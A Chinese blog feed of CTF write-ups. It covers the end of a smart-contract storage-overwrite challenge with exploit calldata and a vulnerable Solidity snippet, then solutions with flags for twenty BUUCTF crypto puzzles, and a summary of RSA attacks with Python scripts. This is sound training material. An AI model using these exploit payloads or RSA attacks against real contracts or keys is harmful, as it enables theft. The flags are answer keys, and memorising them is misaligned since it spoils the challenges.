<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="built_in">hex</span>(<span class="number">0xad0f00e11a82c9e4c6bf0ad52e498f98562d86ac4ff95e82c6ecf0258d19cc74</span>-<span class="number">0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace</span>))</span><br><span class="line"><span class="comment"># 0x6cb778e707daa603d407a7b86a2e53efd3a2538a85784d70cc7722eae95e71a6</span></span><br></pre></td></tr></table></figure>
<p>calldata=0x9bceca6c+6cb778e707daa603d407a7b86a2e53efd3a2538a85784d70cc7722eae95e71a6</p>
<p>成功覆盖余额</p>
<p><img src="/2022/03/11/36/image-20220311114835611.png" alt="image-20220311114835611"></p>
<h3 id="BuyStack-amp-isSolved"><a href="#BuyStack-amp-isSolved" class="headerlink" title="BuyStack &amp;  isSolved"></a>BuyStack &amp;  isSolved</h3><p>calldata=0x705c0f4f000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000008636f646567617465000000000000000000000000000000000000000000000000</p>
<p><img src="/2022/03/11/36/image-20220311115252476.png" alt="image-20220311115252476"></p>
<p>calldata=0x64d98f6e</p>
<p><img src="/2022/03/11/36/image-20220311115334188.png" alt="image-20220311115334188"></p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>这个漏洞的本质在于对Log结构的非显式初始化所带来的变量覆盖问题，修复方案是将声明的 struct 进行赋值初始化，通过创建一个新的临时 memory 结构体，然后将它拷贝到 storage 中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract  Contract&#123;</span><br><span class="line"></span><br><span class="line">    address implementation;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    struct log &#123;</span><br><span class="line">        bytes12 time;</span><br><span class="line">        address sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping (uint &#x3D;&gt; log) Logs;</span><br><span class="line"></span><br><span class="line">    function test() public&#123;</span><br><span class="line">        log storage info &#x3D; Logs[_id];</span><br><span class="line">        info.time &#x3D; bytes12(uint96(block.timestamp));</span><br><span class="line">        info.sender &#x3D; msg.sender;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF CRYPTO 1-20</title>
    <url>/2020/12/17/5/</url>
    <content><![CDATA[<h1 id="BUUCTF-CRYPTO-1-20"><a href="#BUUCTF-CRYPTO-1-20" class="headerlink" title="BUUCTF CRYPTO 1-20"></a>BUUCTF CRYPTO 1-20</h1><h2 id="1-MD5"><a href="#1-MD5" class="headerlink" title="1.MD5"></a>1.MD5</h2><p>下载压缩包解压得到e00cf25ad42683b3df678c61f42c6bda</p>
<p>直接在线解密<a href="https://cmd5.com/">https://cmd5.com/</a></p>
<h3 id="message-digest-algorithm-5-消息摘要算法5"><a href="#message-digest-algorithm-5-消息摘要算法5" class="headerlink" title="message-digest algorithm 5  消息摘要算法5"></a><strong>message-digest algorithm 5</strong>  消息摘要算法5</h3><h3 id="什么是消息摘要算法？"><a href="#什么是消息摘要算法？" class="headerlink" title="什么是消息摘要算法？"></a>什么是消息摘要算法？</h3><p>消息摘要算法是密码学算法中非常重要的一个分支，它通过对所有数据提取指纹信息以实现数据签名、数据完整性校验等功能，由于其不可逆性，有时候会被用做敏感信息的加密。消息摘要算法也被称为哈希（Hash）算法或散列算法。</p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ol>
<li>防止被篡改：作为消息传输后的验证</li>
<li>防止直接被看到明文：替换明文密码储存在网站中</li>
<li>防止抵赖（数字签名）：对含标识的文件的摘要信息记录进行记录，对其他的文件（消息）产生的摘要信息比对，可以唯一确定是否是相同文件（消息）</li>
</ol>
<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>输入任意长度的信息，经过处理，输出为128位的信息（数字指纹）；<br>不同的输入得到的不同的结果（唯一性）；</p>
<h3 id="算法详解"><a href="#算法详解" class="headerlink" title="算法详解"></a>算法详解</h3><p>传送门<a href="https://zpano.gitee.io/2020/12/19/6/">https://zpano.gitee.io/2020/12/19/6/</a></p>
<h2 id="2-URL编码"><a href="#2-URL编码" class="headerlink" title="2.URL编码"></a>2.URL编码</h2><p>%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d</p>
<p>在线解密<a href="http://ctf.ssleye.com/">http://ctf.ssleye.com/</a></p>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>URL是为了 统一的命名网络中的一个资源（URL不是单单为了HTTP协议而定义的，而是网络上的所有的协议都可以使用）</p>
<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><ol>
<li>URL 只能使用 ASCII 字符集来通过因特网进行发送。</li>
<li>由于 URL 常常会包含 ASCII 集合之外的字符，URL 必须转换为有效的 ASCII 格式。</li>
<li>URL 编码使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。</li>
<li>URL 不能包含空格。URL 编码通常使用 + 来替换空格(%2b)或者用%20代替</li>
</ol>
<h2 id="3-一眼就解密"><a href="#3-一眼就解密" class="headerlink" title="3.一眼就解密"></a>3.一眼就解密</h2><p>ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=   base64解密</p>
<h3 id="BASE64"><a href="#BASE64" class="headerlink" title="BASE64"></a>BASE64</h3><p>Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式</p>
<h3 id="编码过程"><a href="#编码过程" class="headerlink" title="编码过程"></a>编码过程</h3><ul>
<li>第一步，将待转换的字符串每三个字节分为一组，每个字节占8bit，那么共有24个二进制位。</li>
<li>第二步，将上面的24个二进制位每6个一组，共分为4组。</li>
<li>第三步，在每组前面添加两个0，每组由6个变为8个二进制位，总共32个二进制位，即四个字节。</li>
</ul>
<p><img src="/2020/12/17/5/base64.jpg" alt="base64"></p>
<ul>
<li>第四步，根据Base64编码对照表（见下图）获得对应的值。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0　A　　17　R　　　34　i　　　51　z</span><br><span class="line">1　B　　18　S　　　35　j　　　52　0</span><br><span class="line">2　C　　19　T　　　36　k　　　53　1</span><br><span class="line">3　D　　20　U　　　37　l　　　54　2</span><br><span class="line">4　E　　21　V　　　38　m　　　55　3</span><br><span class="line">5　F　　22　W　　　39　n　　　56　4</span><br><span class="line">6　G　　23　X　　　40　o　　　57　5</span><br><span class="line">7　H　　24　Y　　　41　p　　　58　6</span><br><span class="line">8　I　　25　Z　　　42　q　　　59　7</span><br><span class="line">9　J　　26　a　　　43　r　　　60　8</span><br><span class="line">10　K　　27　b　　　44　s　　　61　9</span><br><span class="line">11　L　　28　c　　　45　t　　　62　+</span><br><span class="line">12　M　　29　d　　　46　u　　　63　/</span><br><span class="line">13　N　　30　e　　　47　v</span><br><span class="line">14　O　　31　f　　　48　w　　　</span><br><span class="line">15　P　　32　g　　　49　x</span><br><span class="line">16　Q　　33　h　　　50　y</span><br></pre></td></tr></table></figure>
<h3 id="解码过程"><a href="#解码过程" class="headerlink" title="解码过程"></a>解码过程</h3><p>解码原理是将4个字节转换成3个字节.先读入4个6位(用或运算),每次左移6位,再右移3次,每次8位，这样就还原了</p>
<h2 id="4-看我回旋踢"><a href="#4-看我回旋踢" class="headerlink" title="4.看我回旋踢"></a>4.看我回旋踢</h2><p>synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}  凯撒加密 rot-13</p>
<p>顺手写一个循环脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="built_in">input</span>(<span class="string">&quot;Enter a string\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">   <span class="comment"># print(&#x27;&#x27;, j, &#x27;&#x27;,end = &#x27;&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> x.islower():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(x) + <span class="built_in">int</span>(j) &gt; <span class="number">122</span>:   <span class="comment"># ord()函数给出字母的ASCII码</span></span><br><span class="line">                a = <span class="number">96</span> + <span class="built_in">ord</span>(x) + <span class="built_in">int</span>(j) - <span class="number">122</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = <span class="built_in">ord</span>(x) + <span class="built_in">int</span>(j)</span><br><span class="line">        <span class="keyword">if</span> x.isupper():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(x) + <span class="built_in">int</span>(j) &gt; <span class="number">90</span>:  <span class="comment"># ord()函数给出字母的ASCII码</span></span><br><span class="line">                a = <span class="number">64</span> + <span class="built_in">ord</span>(x) + <span class="built_in">int</span>(j) - <span class="number">90</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = <span class="built_in">ord</span>(x) + <span class="built_in">int</span>(j)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == x.isalpha():</span><br><span class="line">            a = <span class="built_in">ord</span>(x)</span><br><span class="line"></span><br><span class="line">        print(<span class="built_in">chr</span>(a),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>对明文的每一位字母进行位移得到密文</p>
<h2 id="5-摩丝"><a href="#5-摩丝" class="headerlink" title="5.摩丝"></a>5.摩丝</h2><p>.. .-.. —- …- . -.— —- ..-</p>
<p>在线解密得到 iloveyou</p>
<p><img src="/2020/12/17/5/mosi.jpg" alt="mosi"></p>
<h2 id="6-签到-y1ng"><a href="#6-签到-y1ng" class="headerlink" title="6.签到-y1ng"></a>6.签到-y1ng</h2><p>QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ== </p>
<p>base64解密</p>
<h2 id="7-PASSWORD"><a href="#7-PASSWORD" class="headerlink" title="7.PASSWORD"></a>7.PASSWORD</h2><p>打开题目看到</p>
<p>姓名：张三</p>
<p>生日：19900315</p>
<p>key{xxxxxxxxxx}</p>
<p>双括号内x的数量为10，生日为8，加姓名缩写，尝试姓名头字母加数字得到flag</p>
<h2 id="8-变异凯撒"><a href="#8-变异凯撒" class="headerlink" title="8.变异凯撒"></a>8.变异凯撒</h2><p>加密密文：AFZ_R9VYFSCOEO_UL^RWUC</p>
<p>格式：FLAG{ }</p>
<p>观察可知AFZ_R与FLAG{ 存在对应关系</p>
<p>利用PYTHON ORD()函数，得到AFZ_R与FLAG{ 对应的ASCII值</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>AFZ_R</th>
<th>97</th>
<th>102</th>
<th>90</th>
<th>95</th>
<th>114</th>
</tr>
</thead>
<tbody>
<tr>
<td>FALG{</td>
<td>102</td>
<td>108</td>
<td>97</td>
<td>103</td>
<td>123</td>
</tr>
<tr>
<td>相差</td>
<td>5</td>
<td>6</td>
<td>7</td>
<td>8</td>
<td>9</td>
</tr>
</tbody>
</table>
</div>
<p>得出规律，写PYTHON脚本解得FLAG{CAESAR_VARIATION}</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">c=[]</span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line"><span class="comment">#字符串转数组，字符转数字</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    c.append(<span class="built_in">ord</span>(a))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#规律，与flag&#123;对应的数字差5，6，7，8，9...</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    c[i]=c[i]+<span class="number">5</span>+i</span><br><span class="line">    </span><br><span class="line"><span class="comment">#数组转字符串</span></span><br><span class="line">new_str = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i%<span class="number">128</span>) <span class="keyword">for</span> i <span class="keyword">in</span> c])</span><br><span class="line"><span class="built_in">print</span> new_str</span><br></pre></td></tr></table></figure>
<h2 id="9-Quoted-printable"><a href="#9-Quoted-printable" class="headerlink" title="9.Quoted-printable"></a>9.Quoted-printable</h2><p>=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</p>
<p>Quoted-printable在线解密<a href="http://ctf.ssleye.com/">http://ctf.ssleye.com/</a></p>
<h3 id="什么是Quoted-printable"><a href="#什么是Quoted-printable" class="headerlink" title="什么是Quoted-printable"></a>什么是Quoted-printable</h3><p>quoted-printable 编码方法适用于所传送的数据中只有少量的非 ASCII 码，例如汉字。这种编码方法的要点就是对于可打印的 ASCII 码，除特殊字符等号 “=” 外，都不改变。</p>
<h3 id="编码方法"><a href="#编码方法" class="headerlink" title="编码方法"></a>编码方法</h3><p>等号 “=” 和不可打印的 ASCII 码以及非 ASCII 码的数据的编码方法是：现将每个字节的二进制代码用两个十六进制数字表示，然后在前面加上一个等号 “=”。</p>
<h2 id="10-RABBIT"><a href="#10-RABBIT" class="headerlink" title="10.RABBIT"></a>10.RABBIT</h2><p>U2FSDGVKX1/+YDNDPOWGBJJJXHZXM2MP2AGI</p>
<p>在线解密</p>
<h2 id="11-篱笆墙的影子"><a href="#11-篱笆墙的影子" class="headerlink" title="11.篱笆墙的影子"></a>11.篱笆墙的影子</h2><p>FELHAAGV{EWTEHTEHFILNAKGW}</p>
<p>根据提示是栅栏密码</p>
<p>在线解密，写个循坏脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zhalan</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(s) - <span class="number">1</span>):</span><br><span class="line">        ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>((<span class="built_in">len</span>(s)+<span class="number">1</span>) / n)):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ans += s[j * n + i]</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        print(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;please input the strings:\n&quot;</span>)</span><br><span class="line">    zhalan(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="什么是栅栏密码"><a href="#什么是栅栏密码" class="headerlink" title="什么是栅栏密码"></a>什么是栅栏密码</h3><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的相同位置的连起来，形成一段无规律的话</p>
<h3 id="举个简单的例子"><a href="#举个简单的例子" class="headerlink" title="举个简单的例子"></a>举个简单的例子</h3><p>对FALG{ABCDEF}按照三个一组分类</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>FLA</th>
<th>G{A</th>
<th>BCD</th>
<th style="text-align:center">EF}</th>
</tr>
</thead>
<tbody>
<tr>
<td>FGBE</td>
<td>L{CE</td>
<td>AAD}</td>
</tr>
</tbody>
</table>
</div>
<p>进行串联变成上面表格第二行的样子</p>
<h2 id="12-RSA"><a href="#12-RSA" class="headerlink" title="12.RSA"></a>12.RSA</h2><p>题目给出：在一次RSA密钥对生成中，假设P=473398607161，Q=4511491，E=17 求解出D作为FLAG提交</p>
<p>附上RSA脚本，后面会出一个RSA总结，这里不再赘述</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
<h2 id="13-丢失的MD5"><a href="#13-丢失的MD5" class="headerlink" title="13.丢失的MD5"></a>13.丢失的MD5</h2><p>题目给出脚本，尝试运行直接出结果</p>
<h2 id="14-老文盲了"><a href="#14-老文盲了" class="headerlink" title="14.老文盲了"></a>14.老文盲了</h2><p>打开题目看到   “罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝”</p>
<p>繁体字朗读一下，提示这就是flag直接交。与佛伦禅需要有佛曰开头</p>
<h2 id="15-ALICE与BOB"><a href="#15-ALICE与BOB" class="headerlink" title="15.ALICE与BOB"></a>15.ALICE与BOB</h2><p>N=98554799767分解得到</p>
<p>101999 * 966233</p>
<p>在线分解大整数网站<a href="http://www.factordb.com/">http://www.factordb.com/</a></p>
<p>之后对101999966233进行MD5加密得到flag</p>
<h2 id="16-RSA"><a href="#16-RSA" class="headerlink" title="16.RSA"></a>16.RSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Until.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>    </span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h2 id="17-大帝的武器密码"><a href="#17-大帝的武器密码" class="headerlink" title="17.大帝的武器密码"></a>17.大帝的武器密码</h2><p>对FRPHEVGL使用题四的脚本发现偏移等于13时得到单词security</p>
<p>COMECHINA加密，得FLAG{PBZRPUVAN}</p>
<h2 id="18-WINDOWS系统密码"><a href="#18-WINDOWS系统密码" class="headerlink" title="18.WINDOWS系统密码"></a>18.WINDOWS系统密码</h2><p>HTTPS://WWW.CMD5.COM/在线解密，试出来一个有解</p>
<p>A7FCB22A88038F35A8F39D503E7F0062解出来是GOOD-LUCK，得FLAG{GOOD-LUCK}</p>
<h2 id="19-CAT-FLAG"><a href="#19-CAT-FLAG" class="headerlink" title="19.CAT_FLAG"></a>19.CAT_FLAG</h2><p><img src="/2020/12/17/5/19.jpg" alt="20"></p>
<p>对于这种只有两种组成的，培根密码，二进制转字符串，摩斯密码</p>
<p>上面显然是二进制转字符串</p>
<p>01000010010010100100010001111011010011010010000101100001001100000111111001111101</p>
<p>转成十六进制424a447b4d2161307e7d</p>
<p>在进行hex编码得到BJD{M!A0~}</p>
<h2 id="20-燕言燕语-Y1NG"><a href="#20-燕言燕语-Y1NG" class="headerlink" title="20.燕言燕语-Y1NG"></a>20.燕言燕语-Y1NG</h2><p>79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</p>
<p>hex编码一下yanzi ZJQ{xilzv_iqssuhoc_suzjg} </p>
<p>维吉尼亚解密得到flag</p>
<h3 id="什么是维吉尼亚密码"><a href="#什么是维吉尼亚密码" class="headerlink" title="什么是维吉尼亚密码"></a>什么是维吉尼亚密码</h3><p><strong>维吉尼亚密码</strong>（又译<strong>维热纳尔密码</strong>）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式（用坐标概念理解）</p>
<p>明文        BJDYA        代表列</p>
<p>密钥        YANZI        代表行</p>
<p>密文        ZJQXI        行列坐标的字母</p>
<p><img src="/2020/12/17/5/20.png" alt="img"></p>
]]></content>
      <categories>
        <category>BUU刷题记录</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Python</tag>
        <tag>Buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA总结</title>
    <url>/2020/12/19/7/</url>
    <content><![CDATA[<h1 id="RSA总结"><a href="#RSA总结" class="headerlink" title="RSA总结"></a>RSA总结</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理:"></a>基本原理:</h2><ol>
<li>选择两个大素数p、q，计算出模数N=p*q</li>
<li>计算欧拉函数φ = (p-1) * (q-1)，随机选择一个e(1&lt;e&lt;φ)，满足e和φ互质</li>
<li>取e的模反数d，计算方法为:e * d ≡ 1 (mod φ)，e一般取65537</li>
<li>对明文m进行加密：c = pow(m, e, N),可以得到密文c   (m&lt;n)</li>
<li>对密文c进行解密：m = pow(c, d, N),可以得到明文m</li>
</ol>
<p>整理：</p>
<ul>
<li>p 和 q：两个大的质数，是另一个参数<code>N</code>的的两个因子。</li>
<li>N：大整数，可以称之为<code>模数</code></li>
<li>e 和 d：互为无反数的两个指数</li>
<li>c 和 m：密文和明文</li>
<li>(N, e)：公钥</li>
<li>(N, d)：私钥</li>
<li>pow(x, y, z)：效果等效<code>pow(x, y) % z</code>， 先计算x的y次方，如果存在另一个参数<code>z</code>，需要再对结果进行取模。</li>
<li>密钥长度：n以二进制表示的的位数，例如密钥长度为512代表n用二进制表示的长度为512bit</li>
<li>一般商业化的密钥取4096位，迄今为止超级计算机破解的密钥位数为700多位</li>
</ul>
<h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>对于RSA加密算法，公钥<code>(N, e)</code>为公钥，可以任意公开，破解RSA最直接（亦或是暴力）的方法就是分解整数<code>N</code>，然后计算<code>欧拉函数φ(n)=(p-1) * (q-1)</code>,再通过<code>d * e ≡ 1 mod φ(N)</code>，即可计算出 <code>d</code>，然后就可以使用私钥<code>(N, d)</code>通过<code>m = pow(c,d,N)</code>解密明文</p>
<h3 id="保障RSA的安全性"><a href="#保障RSA的安全性" class="headerlink" title="保障RSA的安全性"></a>保障RSA的安全性</h3><p>1.定期更换密钥<br>        2.不同的用户不可以使用相同的模数N<br>        3.p与q的差值要大，最好是差几个比特<br>        4.p-1与q-1都应该有大的素因子，一般建议选择的两个大素数p、q使得            p=2p+1和q=2q+1也是素数<br>        5.e的选择不要太小<br>        6.d的选择也是不可以太小，最好满足<code>d&gt;=n的4分之1</code></p>
<h2 id="CTF常见攻击手法"><a href="#CTF常见攻击手法" class="headerlink" title="CTF常见攻击手法"></a>CTF常见攻击手法</h2><p>暴力分解N的方法</p>
<ul>
<li><p>[yafu]: <a href="https://blog.csdn.net/cliffordr/article/details/82747087">https://blog.csdn.net/cliffordr/article/details/82747087</a>    “window下安装yafu”</p>
<p>p,q相差不大或相差巨大时</p>
</li>
<li><p>[factordb]: <a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a>    “在线分解网站”</p>
<p>n不超过1024位时</p>
<p>下面不再分析n能被上述方法分解的情况</p>
</li>
<li><p>对于N由多于两个的素数相乘的情况，N 的欧拉函数的数值由多个素数的欧拉函数相乘</p>
</li>
</ul>
<h3 id="1-对RSA的公共模数攻击（BUU-RSA3）"><a href="#1-对RSA的公共模数攻击（BUU-RSA3）" class="headerlink" title="1.对RSA的公共模数攻击（BUU-RSA3）"></a>1.对RSA的公共模数攻击（BUU-RSA3）</h3><p>适用于：使用相同的模数 N 、不同的私钥，加密同一明文消息</p>
<p>已知c1,c2,e1,e2,n1=n2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m, e1, N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, N)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, d1, N)</span><br><span class="line">m = <span class="built_in">pow</span>(c2, d2, N)</span><br></pre></td></tr></table></figure>
<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="/2020/12/19/7/1.jpg" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line"></span><br><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line"></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="2-公约数分解n"><a href="#2-公约数分解n" class="headerlink" title="2.公约数分解n"></a>2.公约数分解n</h3><p>识别此类题目，通常会发现题目给了多个n，均不相同，并且都是2048bit，4096bit级别，无法正面硬杠，并且明文都没什么联系，e也一般取65537。可以直接<code>gcd(n1,n2)</code>求出一个因数，进而分解n，得到另一个因数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1=<span class="number">9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327</span></span><br><span class="line">n2=<span class="number">13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;p: &quot;</span>+<span class="built_in">str</span>(gcd(n1,n2))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;q1: &quot;</span>+<span class="built_in">str</span>(n1/gcd(n1,n2))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;q2: &quot;</span>+<span class="built_in">str</span>(n2/gcd(n1,n2))</span><br></pre></td></tr></table></figure>
<h3 id="3-低加密指数分解攻击"><a href="#3-低加密指数分解攻击" class="headerlink" title="3.低加密指数分解攻击"></a>3.低加密指数分解攻击</h3><p>在RSA中e也称为加密指数。由于e是随机选取的，如果选取的e太小，导致m^e仍然比模数N来的小，相当于密文C只是明文的e次方而已，可以对密文进行开方即可得到明文</p>
